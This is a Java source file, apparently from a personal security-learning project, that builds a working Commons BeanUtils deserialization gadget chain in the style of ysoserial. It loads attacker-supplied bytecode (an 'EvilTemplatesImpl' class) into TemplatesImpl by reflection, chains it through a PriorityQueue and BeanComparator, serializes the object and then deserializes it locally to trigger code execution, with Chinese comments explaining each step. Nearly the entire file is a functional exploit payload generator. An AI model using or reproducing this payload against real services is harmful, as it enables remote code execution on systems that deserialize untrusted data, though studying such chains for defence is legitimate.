package com.xjjlearning.hack.java.ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.xjjlearning.hack.java.classloader.bytecodes.EvilTemplatesImpl;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ClassUtil;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil;
import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import java.util.Optional;
import java.util.PriorityQueue;

/**
 * created by xjj on 2023/2/9
 */
public class CommonsBeanutil {
    public byte[] getPayload(String exp) throws Exception {

        class TFactory extends TransformerFactoryImpl {}

        byte[] code = ClassUtil.classAsBytes(EvilTemplatesImpl.class);

        TemplatesImpl templates = new TemplatesImpl();
        ReflectionUtil.setFieldValue(templates, "_name", "");
        ReflectionUtil.setFieldValue(templates, "_bytecodes", new byte[][]{code});
        ReflectionUtil.setFieldValue(templates, "_tfactory", new TFactory());

        // PriorityQueue.readObject() -> PriorityQueue.heapify()
        // -> BeanComparator.compare()
        // -> PropertyUtils.getProperty(templates, "outputProperties");
        // -> TemplatesImpl.getOutputProperties() -> newTransformer() -> ...
        BeanComparator comparator = new BeanComparator();

        // 如果在这里加这个而不是使用反射, 则会在下面offer处执行compare, 进而执行我们的getProperty方法, 但是Integer没有所以会报错
        // comparator.setProperty("outputProperties");

        PriorityQueue priorityQueue = new PriorityQueue(2, comparator);
        priorityQueue.offer(1);
        priorityQueue.offer(1);

        // 如果执行这两个而不是上面两个会在第二个地方执行compare方法, 本地执行
        // priorityQueue.offer(templates);
        // priorityQueue.offer(templates);

        // 两个元素执行调整堆大小的操作
        ReflectionUtil.setFieldValue(comparator, "property", "outputProperties");
        ReflectionUtil.setFieldValue(priorityQueue, "queue", new Object[]{templates, templates});
        // 这个comparator不依赖commons-collections且为jre内部类
        ReflectionUtil.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);


        Optional<byte[]> b = SerializationUtil.serialize(priorityQueue);
        return b.get();
    }

    public static void main(String[] args) throws Exception {
        byte[] payload = new CommonsBeanutil().getPayload("");
        SerializationUtil.deserialize(payload);
    }
}
